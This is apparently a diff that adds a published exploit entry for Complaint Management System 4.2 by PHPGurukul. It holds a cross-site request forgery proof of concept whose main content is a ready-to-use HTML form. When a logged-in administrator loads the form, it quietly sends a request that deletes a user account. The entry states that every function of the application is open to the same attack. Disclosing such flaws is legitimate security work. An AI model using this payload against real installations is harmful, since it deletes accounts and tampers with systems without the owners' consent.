@@ -1,0 +1,29 @@
+# Exploit Title: Complaint Management System 4.2 - Cross-Site Request Forgery (Delete User)
+# Author: Besim ALTINOK
+# Vendor Homepage: https://phpgurukul.com/
+# Software Link: https://phpgurukul.com/complaint-management-sytem/
+# Version: v4.2
+# Tested on: Xampp
+# Credit: İsmail BOZKURT
+*************************************************
+Detail:
+
+You can perform CSRF Attack for all the functions.
+
+----------------------------------------------
+
+CSRF PoC for Delete User
+----------------------------------------------
+This request performs over the GET request with uid.
+------------------------------------------------------------------------
+<html>
+<body>
+<script>history.pushState('', '', '/')</script>
+<form action="http://localhost/cms/admin/manage-users.php">
+<input type="hidden" name="uid" value="4" />
+<input type="hidden" name="" value="" />
+<input type="hidden" name="action" value="del" />
+<input type="submit" value="Submit request" />
+</form>
+</body>
+</html>
